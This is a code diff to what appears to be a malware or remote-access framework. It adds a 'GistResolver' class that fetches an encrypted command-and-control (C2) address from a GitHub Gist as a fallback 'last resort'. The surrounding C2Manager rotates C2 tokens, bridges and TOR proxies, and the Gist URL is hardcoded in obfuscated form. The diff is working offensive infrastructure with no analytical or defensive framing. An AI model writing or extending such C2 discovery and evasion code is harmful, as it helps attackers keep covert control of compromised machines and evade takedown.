@@ -7,6 +7,34 @@ import random
 import threading
 from core.obfuscation import decrypt_string
 
+import requests
+import json
+from core.obfuscation import decrypt_string, encrypt_string
+
+class GistResolver:
+    """
+    H-11b: C2 discovery via GitHub Gist.
+    
+    Provides a resilient fallback mechanism for C2 address discovery. 
+    It fetches an encrypted payload from a raw GitHub Gist URL, 
+    decrypts it locally, and provides the current active C2 address.
+    """
+    def __init__(self, gist_url_enc: str):
+        self.gist_url = decrypt_string(gist_url_enc)
+
+    def resolve(self) -> Optional[str]:
+        """Fetch and decrypt C2 address from Gist"""
+        try:
+            # Gist URL should be the raw URL
+            response = requests.get(self.gist_url, timeout=10)
+            if response.status_code == 200:
+                # Expecting an encrypted string in the Gist content
+                return decrypt_string(response.text.strip())
+        except Exception as e:
+            from core.error_logger import log_error
+            log_error(f"GistResolver: Failed to resolve C2: {e}")
+        return None
+
 class C2Manager:
     """Manages multiple C2 tokens with automatic failover"""
 
@@ -29,12 +57,18 @@ class C2Manager:
             "socks5h://127.0.0.1:9150", # TOR Browser
         ]
 
+        self.gist_resolver = GistResolver("BkYMG3R+dgYmFBIdHhcIUhZWAwwmMTlCHwUYVwhL") # Placeholder encrypted Gist URL
+        
         self.current_token_index = 0
         self.current_bridge_index = 0
         self.current_proxy_index = -1 # -1 means no proxy
         self.failed_attempts = 0
         self.max_failures = 3
         self.lock = threading.Lock()
+
+    def get_gist_c2(self) -> Optional[str]:
+        """Fetch C2 from Gist as last resort"""
+        return self.gist_resolver.resolve()
 
     def get_current_token(self):
         """Get current active token"""
